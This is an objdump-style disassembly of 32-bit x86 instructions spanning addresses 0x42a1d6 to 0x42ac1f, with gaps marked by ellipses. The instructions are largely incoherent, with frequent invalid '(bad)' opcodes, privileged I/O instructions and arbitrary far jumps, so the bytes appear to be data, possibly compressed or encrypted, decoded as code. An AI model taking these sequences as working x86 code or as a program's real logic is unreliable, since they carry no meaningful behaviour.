  42a1d6:	jmp    0x42a1e2
  42a1d8:	dec    ebx
  42a1d9:	dec    ebx
  42a1da:	pop    esp
  42a1db:	jnp    0x42a211
  42a1dd:	dec    ebp
  42a1de:	loop   0x42a18e
  42a1e0:	sbb    esi,DWORD PTR [ecx+0x34]
  42a1e3:	push   es
  42a1e4:	xchg   ecx,eax
  42a1e5:	js     0x42a16e
  42a1e7:	dec    eax
  42a1e8:	icebp  
  42a1e9:	mov    edx,0xb1638766
  42a1ee:	push   ebx
  42a1ef:	push   0x7ec869f9
  42a1f4:	ror    DWORD PTR [ebp+0x6a5e038c],cl
  42a1fa:	fwait
  42a1fb:	jl     0x42a1bb
  42a1fd:	cwde   
  42a1fe:	xor    DWORD PTR [edx],0xaf403111
  42a204:	mov    ebp,0xf144be7c
  42a209:	and    DWORD PTR [edx+0x7d],edi
  42a20c:	push   ebp
  42a20d:	ss jl  0x42a1af
	...
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fld    DWORD PTR [esi-0x6f015fad]
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	cmp    BYTE PTR [edi],ah
  42a28e:	int3   
  42a28f:	xor    BYTE PTR [ecx],al
  42a291:	inc    edi
  42a292:	add    DWORD PTR ds:0x6bec19fb,0xffffffb9
  42a299:	aaa    
  42a29a:	jbe    0x42a227
  42a29c:	mov    ah,0xbf
  42a29e:	pop    ebp
  42a29f:	outs   dx,DWORD PTR ds:[esi]
  42a2a0:	std    
  42a2a1:	test   BYTE PTR [ebp+0x77],ch
  42a2a4:	xchg   edi,eax
  42a2a5:	(bad)  
  42a2a6:	ror    BYTE PTR [eax-0xc87b057],1
  42a2ac:	imul   ebp,DWORD PTR [edx-0x17bdb44e],0x69
  42a2b3:	adc    eax,0xd57c5f03
  42a2b8:	fs cmp esp,edi
  42a2bb:	cmp    edx,DWORD PTR [ecx+0x10]
  42a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2bf:	popa   
  42a2c0:	mov    cl,0x7f
  42a2c2:	clc    
  42a2c3:	lock fdivp st(6),st
  42a2c6:	stos   BYTE PTR es:[edi],al
  42a2c7:	mov    ecx,eax
  42a2c9:	mov    al,0xb1
  42a2cb:	pop    ecx
  42a2cc:	fistp  WORD PTR [ecx+esi*4+0x5f]
  42a2d0:	in     al,dx
  42a2d1:	sbb    eax,0x9aae42fb
  42a2d6:	and    ecx,DWORD PTR [esi]
  42a2d8:	cmp    al,0x54
  42a2da:	mov    BYTE PTR [ebx+edx*4+0x43e7f576],cl
  42a2e1:	mov    ecx,0x3dc6b20b
  42a2e6:	rcl    BYTE PTR [edx],cl
  42a2e8:	push   ebx
  42a2e9:	or     al,0x88
  42a2eb:	(bad)  
  42a2ec:	sbb    ebp,DWORD PTR [eax+0x15]
  42a2ef:	mov    ch,0xc7
  42a2f1:	fwait
  42a2f2:	icebp  
  42a2f3:	pop    es
  42a2f4:	xor    dh,bl
  42a2f6:	push   0xe31ca170
  42a2fb:	xchg   ecx,eax
  42a2fc:	lock es push ecx
  42a2ff:	ficom  DWORD PTR [esi]
  42a301:	fsubr  st(5),st
  42a303:	lock rcl DWORD PTR [ebp+0x14bacdc5],0x8c
  42a30b:	shr    DWORD PTR [eax],0xda
  42a30e:	and    al,0x51
  42a310:	shl    BYTE PTR [ebp+0x27dbff3],cl
  42a316:	jo     0x42a2ea
  42a318:	push   eax
  42a319:	outs   dx,DWORD PTR ds:[esi]
  42a31a:	or     eax,0xa62e2184
  42a31f:	and    edx,esi
  42a321:	iret   
  42a322:	cld    
  42a323:	pop    ss
  42a324:	ret    0x1fc
  42a327:	mov    edx,0x98168fe8
  42a32c:	xchg   esp,eax
  42a32d:	sbb    DWORD PTR [esi+0x4efdd0c6],eax
  42a333:	scas   eax,DWORD PTR es:[edi]
  42a334:	es fcmovnbe st,st(2)
  42a337:	nop
  42a338:	pop    ecx
  42a339:	repnz sub DWORD PTR [eax+0x11eeefb1],ebp
  42a340:	loope  0x42a2e4
  42a342:	sbb    ebx,DWORD PTR [eax+0x4e]
  42a345:	xor    BYTE PTR [ecx-0x1e],bl
  42a348:	clc    
  42a349:	ret    
  42a34a:	push   es
  42a34b:	test   al,0xb7
  42a34d:	ss dec ecx
  42a34f:	imul   esi,DWORD PTR [ebx],0x88fa161b
  42a355:	(bad)  [eax-0x62e71cbd]
  42a35b:	jnp    0x42a2df
  42a35d:	or     esi,DWORD PTR [eax]
  42a35f:	jnp    0x42a32f
  42a361:	jno    0x42a2fc
  42a363:	sbb    al,0xe5
  42a365:	or     ch,dl
  42a367:	in     al,dx
  42a368:	jae    0x42a323
  42a36a:	pop    ecx
  42a36b:	cmc    
  42a36c:	inc    eax
  42a36d:	les    ecx,FWORD PTR [edx+0xca5acee]
  42a373:	jae    0x42a3ae
  42a375:	and    dh,dl
  42a377:	and    DWORD PTR [edi],0x51f654d5
  42a37d:	loopne 0x42a3c8
  42a37f:	mov    eax,0x119e03b1
  42a384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a385:	scas   al,BYTE PTR es:[edi]
  42a386:	das    
  42a387:	sbb    ch,bl
  42a389:	jae    0x42a3fa
  42a38b:	jge    0x42a3cf
  42a38d:	clc    
  42a38e:	(bad)  
  42a38f:	out    0x0,eax
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x153dda3d
  42a403:	xchg   ebp,eax
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	mov    WORD PTR [ebx+ebp*4-0x52d67431],?
  42a413:	fimul  DWORD PTR [ecx-0x31]
  42a416:	(bad)  
  42a417:	mov    esi,0x29f90038
  42a41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a41d:	xchg   ecx,eax
  42a41e:	in     al,dx
  42a41f:	dec    esi
  42a420:	pop    edi
  42a421:	xor    dh,BYTE PTR [eax-0x521a8fea]
  42a427:	inc    ecx
  42a428:	xchg   ebx,eax
  42a429:	mov    ss,WORD PTR [edi+edx*8-0x3fee8624]
  42a430:	add    DWORD PTR [ebp+0x70395392],ecx
  42a436:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42a438:	fistp  WORD PTR [edi-0x7049c1e4]
  42a43e:	push   cs
  42a43f:	nop
  42a440:	cli    
  42a441:	adc    DWORD PTR [eax+0x199330ba],esi
  42a447:	nop
  42a448:	push   ds
  42a449:	mov    ebp,0x452b5cba
  42a44e:	add    eax,0xc2d26f09
  42a453:	xchg   edx,eax
  42a454:	cdq    
  42a455:	push   ebx
  42a456:	xlat   BYTE PTR ds:[ebx]
  42a457:	xchg   ebx,eax
  42a458:	mov    cl,0x94
  42a45a:	push   esi
  42a45b:	mov    ecx,0x5f74d618
  42a460:	aaa    
  42a461:	ret    
  42a462:	ret    0x7854
  42a465:	pop    ss
  42a466:	push   0x3a
  42a468:	adc    ecx,DWORD PTR [ebp+edx*8+0x2a]
  42a46c:	imul   edx,DWORD PTR [edi+0x5ceb4c91],0x2b
  42a473:	mov    esi,0xb6fc05ae
  42a478:	mov    ds:0xc7129017,al
  42a47d:	sbb    ch,BYTE PTR [eax+0x2b]
  42a480:	xor    al,0xc
  42a482:	jp     0x42a483
  42a484:	std    
  42a485:	mov    ebp,0x2b5e47d4
  42a48a:	das    
  42a48b:	mov    esp,0x8a0c5e98
  42a490:	xor    al,0xec
  42a492:	aam    0x2c
  42a494:	(bad)  
  42a496:	xor    eax,0x8f6d61fb
  42a49b:	jo     0x42a489
  42a49d:	xor    al,0xbf
  42a49f:	jmp    edx
  42a4a1:	pop    es
  42a4a2:	jmp    0x33f3:0xa11f88ab
  42a4a9:	(bad)  
  42a4aa:	mov    ebp,0x153d33a0
  42a4af:	inc    esp
  42a4b0:	inc    esi
  42a4b1:	mov    eax,0x8b62cd68
  42a4b6:	jmp    0xa20b:0xb69de9a4
  42a4bd:	pop    ebx
  42a4be:	mul    BYTE PTR [ebx-0x13]
  42a4c1:	jo     0x42a4e7
  42a4c3:	std    
  42a4c4:	retf   
  42a4c5:	je     0x42a4e2
  42a4c7:	clc    
  42a4c8:	sub    al,al
  42a4ca:	pop    eax
  42a4cb:	dec    esp
  42a4cc:	imul   edx,DWORD PTR [ecx],0x1b94b108
  42a4d2:	(bad)  
  42a4d3:	sbb    ch,bl
  42a4d5:	jg     0x42a4f2
  42a4d7:	push   0x49
  42a4d9:	jl     0x42a4ef
  42a4db:	xor    BYTE PTR [ebp+0x7a96de57],dl
  42a4e1:	iret   
  42a4e2:	sbb    al,0x31
  42a4e4:	push   ebx
  42a4e5:	imul   ebx,eax,0x588b2c3e
  42a4eb:	mov    DWORD PTR ds:0x71f1741c,esp
  42a4f1:	jo     0x42a51a
  42a4f3:	push   esi
  42a4f4:	inc    esi
  42a4f5:	sbb    al,0x53
  42a4f7:	pop    es
  42a4f8:	fdivp  st(4),st
  42a4fa:	jae    0x42a4e2
  42a4fc:	mov    eax,0x8e76df8d
  42a501:	pop    esp
  42a502:	xchg   ecx,eax
  42a503:	cdq    
  42a504:	pop    eax
  42a505:	sub    eax,0x48318691
  42a50a:	popa   
  42a50b:	jnp    0x42a57d
  42a50d:	mov    ds:0x89f6,eax
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x6da129f
  42a583:	repnz cwde 
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	jl     0x42a591
  42a58e:	stos   DWORD PTR es:[edi],eax
  42a58f:	jbe    0x42a596
  42a591:	push   esp
  42a592:	lods   al,BYTE PTR ds:[esi]
  42a593:	push   ss
  42a594:	dec    edx
  42a595:	mov    edx,0xb495ebc9
  42a59a:	bound  ecx,QWORD PTR [edi]
  42a59c:	call   0xf712a72b
  42a5a1:	sub    eax,0x785b8881
  42a5a6:	test   DWORD PTR [ecx-0x573ed9c2],ecx
  42a5ac:	mov    edx,0x9dbb711f
  42a5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5b2:	or     bh,BYTE PTR [ebx+ebp*2+0x18]
  42a5b6:	sub    al,0xdf
  42a5b8:	pop    eax
  42a5b9:	adc    eax,0x6f8233e2
  42a5be:	aaa    
  42a5bf:	cdq    
  42a5c0:	mov    ds:0xe4f575eb,al
  42a5c5:	aad    0x27
  42a5c7:	push   ds
  42a5c8:	xor    cl,BYTE PTR [edi]
  42a5ca:	les    eax,FWORD PTR [esi-0x79ab1eea]
  42a5d0:	ds mov edi,esi
  42a5d3:	inc    esp
  42a5d4:	rol    DWORD PTR [ebp-0x1edc723d],0x65
  42a5db:	test   eax,0x662350ed
  42a5e0:	imul   esi,DWORD PTR [eax],0x87a88fe2
  42a5e6:	fcmovnb st,st(2)
  42a5e8:	(bad)  
  42a5e9:	cwde   
  42a5ea:	test   BYTE PTR [ecx-0x197f3765],dl
  42a5f0:	pop    edx
  42a5f1:	push   edx
  42a5f2:	push   esp
  42a5f3:	inc    DWORD PTR [esp+eax*2-0x6640d8a6]
  42a5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a5fb:	int3   
  42a5fc:	xor    edx,edi
  42a5fe:	sti    
  42a5ff:	test   BYTE PTR [ebp-0x2a],ch
  42a602:	addr16 pop es
  42a604:	mov    esp,0x1060d3c0
  42a609:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a60b:	daa    
  42a60c:	mov    ebp,0xc712b6cb
  42a611:	jns    0x42a602
  42a613:	xor    bh,BYTE PTR [ecx]
  42a615:	stos   DWORD PTR es:[edi],eax
  42a616:	test   ecx,eax
  42a618:	rol    esp,cl
  42a61a:	and    eax,0x842481a9
  42a61f:	ror    esi,1
  42a621:	cmp    esp,DWORD PTR [edi+0xd]
  42a624:	xchg   ebx,eax
  42a625:	bound  esp,QWORD PTR [edx-0x3a]
  42a628:	or     al,ch
  42a62a:	fldenv [ebx+0x11]
  42a62d:	aad    0x35
  42a62f:	adc    DWORD PTR [edi],edx
  42a631:	pop    ecx
  42a632:	cmp    DWORD PTR [ecx-0x8],esi
  42a635:	sbb    edi,ecx
  42a637:	arpl   WORD PTR [ebx+eax*8],di
  42a63a:	das    
  42a63b:	xchg   esp,eax
  42a63c:	ret    
  42a63d:	dec    si
  42a63f:	idiv   al
  42a641:	scas   al,BYTE PTR es:[edi]
  42a642:	inc    edx
  42a643:	dec    ebx
  42a644:	adc    al,0xf7
  42a646:	pop    ss
  42a647:	(bad)  
  42a648:	out    0xda,al
  42a64a:	jne    0x42a632
  42a64c:	dec    ebx
  42a64d:	shl    cl,0xe2
  42a650:	std    
  42a651:	sub    eax,0x517cfcb6
  42a656:	es mov edi,0x3fc1297
  42a65c:	mov    dl,0xee
  42a65e:	mov    bl,0xd6
  42a660:	cli    
  42a661:	push   esi
  42a662:	fiadd  DWORD PTR [ecx+0x326e5230]
  42a668:	test   al,0x8c
  42a66a:	push   0xda55df93
  42a66f:	or     eax,0x61a44bdb
  42a674:	adc    BYTE PTR [edi],bl
  42a676:	mov    BYTE PTR [eax+0x4b],ch
  42a679:	leave  
  42a67a:	retf   
  42a67b:	retf   0xb1d9
  42a67e:	or     ah,BYTE PTR [ecx]
  42a680:	fs std 
  42a682:	daa    
  42a683:	fsubp  st(3),st
  42a685:	xchg   edi,eax
  42a686:	mov    ah,0xd0
  42a688:	and    eax,0xbfa40870
  42a68d:	lock std 
  42a68f:	pop    DWORD PTR [eax]
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x2547ece4],0x9cc249a8
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	shr    BYTE PTR [ebx+0x272779a2],0xdc
  42a713:	push   cs
  42a714:	cmp    BYTE PTR cs:[edx-0x56],dl
  42a718:	sahf   
  42a719:	cmp    BYTE PTR [ecx+esi*1],dh
  42a71c:	imul   edi,DWORD PTR [ebp+0x2],0x4c
  42a720:	inc    edi
  42a721:	test   eax,0x810ceadb
  42a726:	jo     0x42a751
  42a728:	bound  edi,QWORD PTR ds:0xa341b8e8
  42a72e:	in     eax,dx
  42a72f:	mov    ds:0x410f6ae4,al
  42a734:	fmul   DWORD PTR [ecx+0x78f23e30]
  42a73a:	sbb    al,0x2b
  42a73c:	inc    ebx
  42a73d:	ss das 
  42a73f:	lahf   
  42a740:	dec    edi
  42a741:	fmulp  st(5),st
  42a743:	dec    esp
  42a744:	call   0xf2cf:0xf90f4972
  42a74b:	not    BYTE PTR [eax+0x79]
  42a74e:	and    esp,edi
  42a750:	mov    cl,0x87
  42a752:	adc    DWORD PTR [esp+edi*4+0x53],esp
  42a756:	or     al,0xd9
  42a758:	fiadd  DWORD PTR [ebp+0x1b250279]
  42a75e:	xchg   edi,eax
  42a75f:	pop    esi
  42a760:	add    bl,BYTE PTR [ebx+0xa]
  42a763:	lea    ebx,[ebp+0x1c6a928d]
  42a769:	imul   DWORD PTR [ecx+edi*1-0xaf2d06e]
  42a770:	mov    ebp,0x66478359
  42a775:	shr    BYTE PTR [edi+0x69],0xd5
  42a779:	adc    al,0x5c
  42a77b:	adc    eax,0x3ba1abb5
  42a780:	stos   BYTE PTR es:[edi],al
  42a781:	cmp    al,BYTE PTR [ebx+0x44]
  42a784:	iret   
  42a785:	xor    eax,0x8de6c396
  42a78a:	dec    edi
  42a78b:	inc    edi
  42a78c:	sbb    eax,0xa3abbfb1
  42a791:	daa    
  42a792:	lods   al,BYTE PTR ds:[esi]
  42a793:	push   ecx
  42a794:	lock jnp 0x42a75a
  42a797:	pop    ss
  42a798:	or     bh,BYTE PTR [edi]
  42a79a:	sub    BYTE PTR [ebp-0x22572f7d],cl
  42a7a0:	nop
  42a7a1:	into   
  42a7a2:	push   0xce75f4bb
  42a7a7:	shl    bl,cl
  42a7a9:	daa    
  42a7aa:	cmp    DWORD PTR [ecx+0x558a3c05],edi
  42a7b0:	fs nop
  42a7b2:	js     0x42a7bf
  42a7b4:	scas   al,BYTE PTR es:[edi]
  42a7b5:	div    BYTE PTR [ebx-0x2a74fa3b]
  42a7bb:	(bad)  
  42a7bc:	into   
  42a7bd:	nop
  42a7be:	adc    BYTE PTR [edx+0x29],al
  42a7c1:	sahf   
  42a7c2:	or     al,0x8
  42a7c4:	dec    ebx
  42a7c5:	pop    eax
  42a7c6:	pop    ecx
  42a7c7:	sbb    esp,DWORD PTR [ecx+ebx*1]
  42a7ca:	mov    ah,bh
  42a7cc:	rol    edx,cl
  42a7ce:	push   0x5e
  42a7d0:	call   0x4452481a
  42a7d5:	cs sbb dl,ah
  42a7d8:	push   ebx
  42a7d9:	int    0x87
  42a7db:	xchg   DWORD PTR [ebx+0x698bf6ba],ebx
  42a7e1:	inc    ebx
  42a7e2:	jecxz  0x42a7de
  42a7e4:	push   ebp
  42a7e5:	shl    DWORD PTR [eax+0x3fce6520],cl
  42a7eb:	or     al,bh
  42a7ed:	sub    BYTE PTR ds:0x59eebe9a,ch
  42a7f3:	pop    es
  42a7f4:	mov    ds:0x5cd1f312,eax
  42a7f9:	inc    ebx
  42a7fa:	ins    BYTE PTR es:[edi],dx
  42a7fb:	jmp    0xdaadb47e
  42a800:	xchg   ebx,eax
  42a801:	bound  ecx,QWORD PTR [ecx+eiz*4+0x28]
  42a805:	nop
  42a806:	push   es
  42a807:	mov    ds:0xf8aea0c9,eax
  42a80c:	sahf   
  42a80d:	xchg   ecx,eax
  42a80e:	lods   al,BYTE PTR ds:[esi]
  42a80f:	pop    ebp
	...
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x960d6c97
  42a882:	js     0x42a85d
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebx],dl
  42a88d:	shl    eax,1
  42a88f:	sub    BYTE PTR [ecx+0x28],dl
  42a892:	mov    esp,0xfbaaa55b
  42a897:	and    eax,esi
  42a899:	push   cs
  42a89a:	shl    ebp,cl
  42a89c:	int    0xce
  42a89e:	int    0xae
  42a8a0:	push   ecx
  42a8a1:	mov    esi,0xbe48bb8e
  42a8a6:	fild   DWORD PTR [eax+0x72]
  42a8a9:	or     eax,0x63b29aec
  42a8ae:	fs ret 
  42a8b0:	push   esp
  42a8b1:	(bad)  
  42a8b2:	jp     0x42a864
  42a8b4:	retf   0xc2eb
  42a8b7:	dec    eax
  42a8b8:	mov    bh,0x7a
  42a8ba:	in     eax,dx
  42a8bb:	dec    eax
  42a8bc:	aaa    
  42a8bd:	loopne 0x42a935
  42a8bf:	icebp  
  42a8c0:	sbb    ecx,DWORD PTR [esi+0x69]
  42a8c3:	or     al,0xc5
  42a8c5:	mov    bh,0xc3
  42a8c7:	adc    bl,BYTE PTR [edi-0x4b]
  42a8ca:	dec    esi
  42a8cb:	lods   eax,DWORD PTR ds:[esi]
  42a8cc:	bnd jle 0x42a8ea
  42a8cf:	adc    dl,bh
  42a8d1:	(bad)  
  42a8d4:	mov    ds:0xba0ab59f,eax
  42a8d9:	retf   0xfd4
  42a8dc:	push   esp
  42a8dd:	jbe    0x42a8e5
  42a8df:	lods   eax,DWORD PTR ds:[esi]
  42a8e0:	outs   dx,DWORD PTR ds:[esi]
  42a8e1:	pop    ds
  42a8e2:	std    
  42a8e3:	out    dx,al
  42a8e4:	pop    eax
  42a8e5:	xor    BYTE PTR [ebx+edi*8-0x713938d1],bh
  42a8ec:	sbb    DWORD PTR [esi],edx
  42a8ee:	inc    ebp
  42a8ef:	scas   al,BYTE PTR es:[edi]
  42a8f0:	jg     0x42a91b
  42a8f2:	sub    al,0x49
  42a8f4:	loope  0x42a8c9
  42a8f6:	push   ecx
  42a8f7:	test   BYTE PTR [ecx],bl
  42a8f9:	std    
  42a8fa:	mov    ch,cl
  42a8fc:	xor    al,0x1f
  42a8fe:	xor    eax,DWORD PTR [esi-0x7f83239f]
  42a904:	sbb    dl,BYTE PTR [esi-0x77bcb0b5]
  42a90a:	imul   ecx,DWORD PTR [edx],0x32
  42a90d:	dec    esp
  42a90e:	jp     0x42a8ac
  42a910:	xor    DWORD PTR [eax+eax*2-0x3a],0x4506649
  42a918:	jecxz  0x42a8e8
  42a91a:	inc    ebp
  42a91b:	lahf   
  42a91c:	daa    
  42a91d:	fs sar eax,1
  42a920:	pusha  
  42a921:	dec    ebx
  42a922:	mov    edx,0x96ef5649
  42a927:	and    eax,0x9af0f03a
  42a92d:	dec    edi
  42a92e:	aaa    
  42a92f:	(bad)  
  42a930:	mov    eax,ds:0xaa33a1bd
  42a935:	fist   WORD PTR [ebx-0x66ec16ea]
  42a93b:	sahf   
  42a93c:	shl    al,1
  42a93e:	ss mov dl,0xfc
  42a941:	mov    eax,0xfee10047
  42a946:	mov    ebx,0xac2bc602
  42a94b:	repz xor ah,BYTE PTR [edx]
  42a94e:	dec    ebp
  42a94f:	test   eax,0x89f3730
  42a954:	jecxz  0x42a8fb
  42a956:	out    dx,al
  42a957:	ds inc ebx
  42a959:	inc    ebx
  42a95a:	inc    ebp
  42a95b:	inc    edi
  42a95c:	fwait
  42a95d:	mov    cs,WORD PTR [ecx+0x48030771]
  42a963:	fcom   QWORD PTR [eax+eax*4-0x2d]
  42a967:	mov    esi,0x27449f7d
  42a96c:	pushf  
  42a96d:	fimul  WORD PTR [eax]
  42a96f:	out    dx,eax
  42a970:	outs   dx,DWORD PTR ds:[esi]
  42a971:	add    BYTE PTR [ecx+eiz*2-0x40a335fe],0x98
  42a979:	xchg   edi,eax
  42a97a:	and    DWORD PTR [edx],ecx
  42a97c:	mov    esi,0xecdcb9fb
  42a981:	jae    0x42a943
  42a983:	or     eax,0xbdd766f3
  42a988:	inc    ecx
  42a989:	pop    ss
  42a98a:	loopne 0x42a95e
  42a98c:	lock je 0x42a93e
  42a98f:	dec    edx
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	into   
  42aa01:	mov    ecx,0xc7a425f4
  42aa06:	add    DWORD PTR [eax],eax
  42aa08:	add    al,0x1
  42aa0a:	add    BYTE PTR [eax],al
  42aa0c:	push   es
  42aa0d:	popf   
  42aa0e:	pop    ss
  42aa0f:	(bad)  [edx-0x4c]
  42aa12:	push   0xa1e6e4be
  42aa17:	or     BYTE PTR [edi-0x37],dh
  42aa1a:	ret    
  42aa1b:	sub    DWORD PTR [ebx-0x354dfcd8],esp
  42aa21:	mov    bl,0x78
  42aa23:	adc    edi,ebp
  42aa25:	nop
  42aa26:	int3   
  42aa27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa28:	or     eax,0x674b56fc
  42aa2d:	lods   al,BYTE PTR ds:[esi]
  42aa2e:	int    0x95
  42aa30:	out    dx,al
  42aa31:	shl    cl,cl
  42aa33:	jns    0x42a9db
  42aa35:	std    
  42aa36:	ja     0x42aa28
  42aa38:	sahf   
  42aa39:	retf   0x2f41
  42aa3c:	popa   
  42aa3d:	jecxz  0x42aa24
  42aa3f:	cs mov cl,BYTE PTR cs:[ecx+0x1cfe51cd]
  42aa47:	aaa    
  42aa48:	mov    DWORD PTR [ebx+edi*4+0x38],esp
  42aa4c:	aas    
  42aa4d:	aam    0x2d
  42aa4f:	lahf   
  42aa50:	hlt    
  42aa51:	cld    
  42aa52:	cs push ebp
  42aa54:	pusha  
  42aa55:	sbb    DWORD PTR [edi+0x7d767960],0x5e0376c1
  42aa5f:	add    dh,BYTE PTR [esi]
  42aa61:	mov    ecx,0x742b75b1
  42aa66:	inc    edi
  42aa67:	and    eax,0x3b284b72
  42aa6c:	sahf   
  42aa6d:	jle    0x42aa17
  42aa6f:	imul   ecx,DWORD PTR [edx],0x190daaf8
  42aa75:	scas   eax,DWORD PTR es:[edi]
  42aa76:	in     eax,0xa9
  42aa78:	iret   
  42aa79:	fdivr  DWORD PTR [ebp+0x5]
  42aa7c:	stos   DWORD PTR es:[edi],eax
  42aa7d:	jmp    0x49c3:0xcf0f1abe
  42aa84:	pop    esi
  42aa85:	or     eax,0x6f841eff
  42aa8a:	mov    edx,0xee060b25
  42aa8f:	arpl   bx,si
  42aa91:	in     eax,dx
  42aa92:	aas    
  42aa93:	mov    eax,0xf6120d3b
  42aa98:	xchg   esi,eax
  42aa99:	fstp   TBYTE PTR [eax+0x5030934f]
  42aa9f:	push   ecx
  42aaa0:	sar    BYTE PTR [esi+0x150bb315],cl
  42aaa6:	push   ebp
  42aaa7:	aas    
  42aaa8:	sar    ah,cl
  42aaaa:	lds    edi,FWORD PTR [ecx-0x13]
  42aaad:	mov    WORD PTR [eax+0x66],cs
  42aab0:	xchg   dh,ah
  42aab2:	xchg   edx,eax
  42aab3:	scas   al,BYTE PTR es:[edi]
  42aab4:	jle    0x42aace
  42aab6:	jg     0x42aa65
  42aab8:	pop    ebp
  42aab9:	aad    0xaf
  42aabb:	push   ebx
  42aabc:	rcl    DWORD PTR [esi],0x88
  42aabf:	mov    dh,0x1a
  42aac1:	push   ebx
  42aac2:	xor    eax,0xc08f49dc
  42aac7:	add    ebp,eax
  42aac9:	sub    BYTE PTR ds:0x926d69d4,ch
  42aacf:	sbb    ah,BYTE PTR [ebp+0x60]
  42aad2:	mov    ebx,0xae98803c
  42aad7:	lock mov dl,0xa1
  42aada:	aas    
  42aadb:	mov    edi,0x77c4639a
  42aae0:	mov    eax,ds:0xc2a64f1e
  42aae5:	xchg   edi,eax
  42aae6:	or     eax,0x4e0f2207
  42aaeb:	stos   DWORD PTR es:[edi],eax
  42aaec:	lds    esp,FWORD PTR [ecx+0x41761145]
  42aaf2:	jns    0x42aaf9
  42aaf4:	shl    DWORD PTR [ebp-0x39db4bda],0x4
  42aafb:	out    dx,eax
  42aafc:	mov    edx,0x894f313e
  42ab01:	dec    eax
  42ab02:	sub    ebx,DWORD PTR gs:[esi]
  42ab05:	dec    ebp
  42ab06:	aaa    
  42ab07:	cwde   
  42ab08:	dec    ebx
  42ab09:	jmp    0x2ecd:0x6987c59d
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	jo     0xc8eb5d7c
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	inc    ebx
  42ab8d:	neg    DWORD PTR ds:0x95b218ea
  42ab93:	dec    esi
  42ab94:	fiadd  DWORD PTR [edi+0x0]
  42ab97:	mov    al,ds:0x4c1c12e4
  42ab9c:	cmp    ecx,esi
  42ab9e:	jp     0x42ac1b
  42aba0:	pop    esi
  42aba1:	outs   dx,DWORD PTR ds:[esi]
  42aba2:	std    
  42aba3:	aas    
  42aba4:	ret    0xae0a
  42aba7:	xor    dl,BYTE PTR [ebx-0x7d]
  42abaa:	repz test BYTE PTR [edi-0xdaf7916],cl
  42abb1:	push   ss
  42abb2:	mov    ebx,0x501541e5
  42abb7:	and    DWORD PTR [ebx+eiz*4+0x14],eax
  42abbb:	xchg   edi,eax
  42abbc:	rol    BYTE PTR [ebp+0x1f8bcef1],cl
  42abc2:	sahf   
  42abc3:	jne    0x42abbe
  42abc5:	mov    ebx,0x74e3ad61
  42abca:	loope  0x42ac0f
  42abcc:	mov    eax,0x3d246f8c
  42abd1:	jbe    0x42aba8
  42abd3:	aaa    
  42abd4:	cmp    esp,DWORD PTR [ecx+ebx*2]
  42abd7:	mov    ebp,0xa640c83a
  42abdc:	or     cl,BYTE PTR [ebx+0x708bc60b]
  42abe2:	int    0xf2
  42abe4:	jmp    0x42abb7
  42abe6:	test   eax,0x751f1c9
  42abeb:	adc    DWORD PTR [esi-0x10],ebp
  42abee:	inc    eax
  42abef:	adc    DWORD PTR [esi+edi*4],edi
  42abf2:	adc    eax,0x21e6f2d5
  42abf7:	sti    
  42abf8:	pop    eax
  42abf9:	and    al,0x1f
  42abfb:	add    eax,0xeb79bdb1
  42ac00:	out    dx,al
  42ac01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac02:	pop    ebp
  42ac03:	sbb    al,0x86
  42ac05:	repz pushf 
  42ac07:	ds ja  0x42abf6
  42ac0a:	fcomp  QWORD PTR [edi]
  42ac0c:	push   esp
  42ac0d:	cwde   
  42ac0e:	add    edx,edx
  42ac10:	or     esp,esp
  42ac12:	jp     0x42abd0
  42ac14:	popf   
  42ac15:	push   0x37fa7cc
  42ac1a:	mov    al,ds:0xc3268a0d
  42ac1f:	adc    al,0x66
